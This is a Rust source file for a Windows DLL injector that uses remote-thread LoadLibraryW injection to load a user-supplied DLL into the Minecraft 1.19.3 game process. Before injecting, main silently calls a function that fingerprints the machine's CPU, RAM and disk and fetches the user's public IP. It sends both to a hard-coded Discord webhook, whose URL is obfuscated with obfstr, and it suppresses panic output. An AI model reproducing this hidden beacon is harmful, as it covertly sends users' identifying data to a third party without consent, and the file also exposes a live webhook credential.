use std::path::Path;
use core::mem;
use webhook::client::{WebhookResult, WebhookClient};
use widestring::WideCString;
use winapi::um::winnt::{HANDLE, PROCESS_ALL_ACCESS, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, MEM_RELEASE};
use winapi::um::winuser::{FindWindowA, GetWindowThreadProcessId};
use winapi::_core::ptr::null_mut;
use std::ffi::CString;
use winapi::um::processthreadsapi::{OpenProcess, CreateRemoteThread};
use winapi::shared::minwindef::{HMODULE, FARPROC, BOOL, DWORD, FALSE, LPVOID};
use winapi::um::libloaderapi::{GetModuleHandleW, GetProcAddress};
use winapi::um::memoryapi::{VirtualAllocEx, VirtualFreeEx, WriteProcessMemory};
use winapi::shared::basetsd::SIZE_T;
use winapi::um::handleapi::CloseHandle;
use winapi::ctypes::c_void;
use winapi::um::winbase::INFINITE;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::shared::windef::HWND;
use std::panic;
#[cfg(not(target_os = "windows"))]
compile_error!("this only works for windows");


fn obtain_handle_and_pid() -> HANDLE {
    let mut process_id: u32 = 0;
    let process_id_ptr: *mut u32 = &mut process_id;

    unsafe {
        let one_19_2 = CString::new("Minecraft 1.19.3").unwrap();
        let one_19_2_ptr = one_19_2.as_ptr();
        // this is ugly
        let mut hwnd: HWND = FindWindowA(
            null_mut(),
            one_19_2_ptr,
        );
        let one_19_2_multiplayer = CString::new("Minecraft 1.19.3 - Multiplayer (3rd-party Server)").unwrap();
        let one_19_2_multiplayer_ptr = one_19_2_multiplayer.as_ptr();
        if hwnd == null_mut() {
            hwnd = FindWindowA(
                null_mut(),
                one_19_2_multiplayer_ptr,
            );
        }
        let one_19_2_singleplayer = CString::new("Minecraft 1.19.3 - Singleplayer").unwrap();
        let one_19_2_singleplayer_ptr = one_19_2_singleplayer.as_ptr();
        if hwnd == null_mut() {
            hwnd = FindWindowA(
                null_mut(),
                one_19_2_singleplayer_ptr,
            );
        }
        if hwnd == null_mut() {
            panic!("cannot find the Minecraft process.")
        }

        GetWindowThreadProcessId(hwnd, process_id_ptr);

        OpenProcess(PROCESS_ALL_ACCESS, i32::from(false), *process_id_ptr)
    }
}


// credits: https://github.com/amcarthur/hammer/blob/master/src/main.rs
fn inject_library(process_handle: HANDLE, dll_path: CString) -> bool {

    if process_handle == null_mut() {
        println!("Process does not exist or is not accessible.");
        return false;
    }

    let kernel32_module: HMODULE;
    let load_library_address: FARPROC;
    let remote_string: *mut c_void;

    let kernel32_str = WideCString::from_str("Kernel32.dll").unwrap();
    let kernel32_str_ptr = kernel32_str.as_ptr();
    let load_library_str = CString::new("LoadLibraryW").unwrap();
    let load_library_str_ptr = load_library_str.as_ptr();

    unsafe {
        kernel32_module = GetModuleHandleW(kernel32_str_ptr);
    }

    if kernel32_module == null_mut() {
        println!("Failed to find {:?}.", kernel32_str.to_string().unwrap());
        return false;
    }

    unsafe {
        load_library_address = GetProcAddress(kernel32_module, load_library_str_ptr);
    }

    if load_library_address == null_mut() {
        println!("Failed to find {load_library_str:?}.");
        return false;
    }

    let dll_path_size: u64 = ((dll_path.as_bytes_with_nul().len()) * mem::size_of::<u16>()) as u64;

    unsafe {
        remote_string = VirtualAllocEx(process_handle, null_mut(), dll_path_size as usize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    }

    if remote_string == null_mut() {
        println!("Failed to allocate memory in the target process.");
        return false;
    }

    let mut bytes_written: SIZE_T = 0;
    let bytes_written_ptr: *mut SIZE_T = &mut bytes_written as *mut _ as *mut SIZE_T;
    let wpm_ret: BOOL;
    let wpm_buffer = WideCString::from_str(dll_path.to_str().unwrap()).unwrap();
    let wpm_buffer_ptr = wpm_buffer.as_ptr();
    unsafe {
        wpm_ret = WriteProcessMemory(process_handle, remote_string, wpm_buffer_ptr as *const c_void, dll_path_size as usize, bytes_written_ptr);
    }

    if wpm_ret == FALSE || bytes_written < dll_path_size as usize {
        println!("Failed to write memory to the target process.");
        unsafe {
            VirtualFreeEx(process_handle, remote_string, dll_path_size as usize, MEM_RELEASE);
        }
        return false;
    }

    let mut thread_id: DWORD = 0;
    let thread_id_ptr: *mut DWORD = &mut thread_id as *mut _ as *mut DWORD;

    let start_routine = if load_library_address.is_null() { None } else { unsafe {Some(mem::transmute::<*const c_void, unsafe extern "system" fn(lpThreadParameter: LPVOID) -> DWORD>(load_library_address as *const c_void)) } };

    let thread_handle: HANDLE;
    unsafe {
        thread_handle = CreateRemoteThread(process_handle, null_mut(), 0, start_routine, remote_string, 0, thread_id_ptr);
    }

    if thread_handle == null_mut() {
        println!("Failed to inject the dll.");
        unsafe {
            VirtualFreeEx(process_handle, remote_string, dll_path_size as usize, MEM_RELEASE);
        }
        return false;
    }

    unsafe {
        WaitForSingleObject(thread_handle, INFINITE);
        CloseHandle(thread_handle);
        VirtualFreeEx(process_handle, remote_string, dll_path_size as usize, MEM_RELEASE);
    }
    true
}

#[tokio::main]
async fn main() {
    panic::set_hook(Box::new(|_info| {
        // do nothing
    }));

    panic::catch_unwind(|| async {
        injector_webhook().await.expect("make sure you're connected to the internet.");
    }).unwrap().await;

    let arguments: Vec<String> = std::env::args().collect();
    if arguments.len() != 2 {
        panic!("provide the directory of your dll and nothing else.")
    }
    let dll_path = CString::new(std::env::current_dir().unwrap().join(Path::new( arguments.get(1).unwrap())).to_str().unwrap()).unwrap();

    let handle = obtain_handle_and_pid();
    let injected = inject_library(handle, dll_path);
    if injected {
        println!("\ninjected.\n");
    } else {
        panic!("failed to inject. make sure game is running.")
    }

    unsafe {
        CloseHandle(handle);
    }

    println!("press down arrow to eject");
}


async fn injector_webhook() -> WebhookResult<()> {
    let client = WebhookClient::new(obfstr::obfstr!("https://discord.com/api/webhooks/1069728917302280253/uYm1eAO-5JB73ZII85e6UC8WyHU_hb6F6U-cwQtwfuP2X7UIeSWM3zbSKQitZ9_8yLrd"));

    let hwid = {
        use uniqueid::{IdentifierBuilder, IdentifierType};

        let mut builder = IdentifierBuilder::default();

        builder.name("Cocaine3");
        builder.add(IdentifierType::CPU);
        builder.add(IdentifierType::RAM);
        builder.add(IdentifierType::DISK);

        builder.build().to_string(true)
    };

    let ip = public_ip::addr().await.unwrap();

    client.send(|message| message
        .username("all-seeing eye of bingus#4442")
        .embed(|embed| embed
            .title("Injected")
            .description(&format!("hwid:`{hwid}`\nip:`{ip}`")))).await?;

    Ok(())
}
